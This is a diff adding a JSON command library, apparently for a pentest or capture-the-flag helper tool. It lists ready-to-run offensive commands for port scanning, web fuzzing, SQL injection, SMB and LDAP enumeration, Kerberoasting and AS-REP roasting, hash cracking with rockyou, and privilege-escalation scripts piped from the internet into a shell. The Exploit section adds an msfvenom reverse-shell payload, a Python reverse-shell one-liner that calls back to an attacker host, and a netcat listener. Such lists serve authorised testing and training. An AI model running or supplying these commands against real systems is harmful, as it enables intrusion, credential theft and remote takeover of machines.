@@ -1,0 +1,217 @@
+[
+  {
+    "category": "Recon",
+    "name": "Nmap Full Scan",
+    "command": "nmap -sV -sC -p- <ip> -oN scan_<ip>.txt",
+    "description": "Full version & script scan on all ports",
+    "tags": [
+      "nmap",
+      "scan"
+    ]
+  },
+  {
+    "category": "Recon",
+    "name": "Nmap Quick Scan",
+    "command": "nmap -T4 -F <ip>",
+    "description": "Fast scan on common ports",
+    "tags": [
+      "nmap",
+      "quick"
+    ]
+  },
+  {
+    "category": "Recon",
+    "name": "Nmap UDP Scan",
+    "command": "nmap -sU --top-ports 200 <ip> -oN udp_<ip>.txt",
+    "description": "UDP scan on top 200 ports",
+    "tags": [
+      "nmap",
+      "udp",
+      "scan"
+    ]
+  },
+  {
+    "category": "Web",
+    "name": "Gobuster Dir",
+    "command": "gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/common.txt",
+    "description": "Directory brute-force with common wordlist",
+    "tags": [
+      "gobuster",
+      "web",
+      "fuzz"
+    ]
+  },
+  {
+    "category": "Web",
+    "name": "Ffuf Fuzz",
+    "command": "ffuf -u http://<ip>/FUZZ -w /usr/share/wordlists/dirb/common.txt",
+    "description": "Fast web fuzzer",
+    "tags": [
+      "ffuf",
+      "web",
+      "fuzz"
+    ]
+  },
+  {
+    "category": "Web",
+    "name": "Nikto Scan",
+    "command": "nikto -h http://<ip> -o nikto_<ip>.txt",
+    "description": "Web server vulnerability scanner",
+    "tags": [
+      "nikto",
+      "web",
+      "vuln"
+    ]
+  },
+  {
+    "category": "Web",
+    "name": "SQLMap Basic",
+    "command": "sqlmap -u 'http://<ip>/page?id=1' --batch --dbs",
+    "description": "Auto SQL injection, enumerate databases",
+    "tags": [
+      "sqlmap",
+      "sqli",
+      "web"
+    ]
+  },
+  {
+    "category": "SMB",
+    "name": "Enum4linux",
+    "command": "enum4linux -a <ip>",
+    "description": "Enumerate SMB shares, users, groups",
+    "tags": [
+      "smb",
+      "enum"
+    ]
+  },
+  {
+    "category": "SMB",
+    "name": "SMBMap",
+    "command": "smbmap -H <ip> -u <user> -p <password>",
+    "description": "Map SMB shares with credentials",
+    "tags": [
+      "smb",
+      "shares"
+    ]
+  },
+  {
+    "category": "LDAP",
+    "name": "LDAPSearch Anonymous",
+    "command": "ldapsearch -x -H ldap://<ip> -b 'dc=<domain>,dc=<tld>' '(objectClass=*)'",
+    "description": "Anonymous LDAP enumeration",
+    "tags": [
+      "ldap",
+      "enum",
+      "ad"
+    ]
+  },
+  {
+    "category": "LDAP",
+    "name": "LDAPSearch Users",
+    "command": "ldapsearch -x -H ldap://<ip> -D '<user>@<domain>' -w '<password>' -b 'dc=<domain>,dc=<tld>' '(objectClass=person)'",
+    "description": "Enumerate AD users via LDAP with credentials",
+    "tags": [
+      "ldap",
+      "ad",
+      "users"
+    ]
+  },
+  {
+    "category": "Kerberos",
+    "name": "GetNPUsers (AS-REP Roast)",
+    "command": "impacket-GetNPUsers <domain>/ -usersfile <userlist> -no-pass -dc-ip <ip> -outputfile asrep_hashes.txt",
+    "description": "AS-REP Roasting \u2014 get hashes for accounts without pre-auth",
+    "tags": [
+      "kerberos",
+      "asrep",
+      "impacket",
+      "ad"
+    ]
+  },
+  {
+    "category": "Kerberos",
+    "name": "GetUserSPNs (Kerberoast)",
+    "command": "impacket-GetUserSPNs <domain>/<user>:<password> -dc-ip <ip> -request -outputfile kerberoast_hashes.txt",
+    "description": "Kerberoasting \u2014 extract TGS hashes for cracking",
+    "tags": [
+      "kerberos",
+      "kerberoast",
+      "impacket",
+      "ad"
+    ]
+  },
+  {
+    "category": "Exploit",
+    "name": "MSFvenom Reverse Shell (EXE)",
+    "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f exe -o shell.exe",
+    "description": "Generate Windows reverse shell payload",
+    "tags": [
+      "msfvenom",
+      "payload",
+      "windows"
+    ]
+  },
+  {
+    "category": "Exploit",
+    "name": "Python Reverse Shell",
+    "command": "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"<lhost>\",<lport>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+    "description": "Python3 reverse shell one-liner",
+    "tags": [
+      "revshell",
+      "python"
+    ]
+  },
+  {
+    "category": "Post-Exploit",
+    "name": "LinPEAS",
+    "command": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+    "description": "Linux privilege escalation script",
+    "tags": [
+      "privesc",
+      "linux"
+    ]
+  },
+  {
+    "category": "Post-Exploit",
+    "name": "WinPEAS (via Curl)",
+    "command": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -o winpeas.exe && ./winpeas.exe",
+    "description": "Windows privilege escalation script",
+    "tags": [
+      "privesc",
+      "windows",
+      "winpeas"
+    ]
+  },
+  {
+    "category": "Post-Exploit",
+    "name": "Netcat Listener",
+    "command": "nc -lvnp <lport>",
+    "description": "Start a netcat listener",
+    "tags": [
+      "nc",
+      "listener"
+    ]
+  },
+  {
+    "category": "Crack",
+    "name": "Hashcat Auto-Detect",
+    "command": "hashcat <hashfile> /usr/share/wordlists/rockyou.txt --force",
+    "description": "Crack hashes with rockyou, auto-detect mode",
+    "tags": [
+      "hashcat",
+      "crack",
+      "password"
+    ]
+  },
+  {
+    "category": "Crack",
+    "name": "John the Ripper",
+    "command": "john <hashfile> --wordlist=/usr/share/wordlists/rockyou.txt",
+    "description": "Crack hashes with John using rockyou",
+    "tags": [
+      "john",
+      "crack",
+      "password"
+    ]
+  }
+]
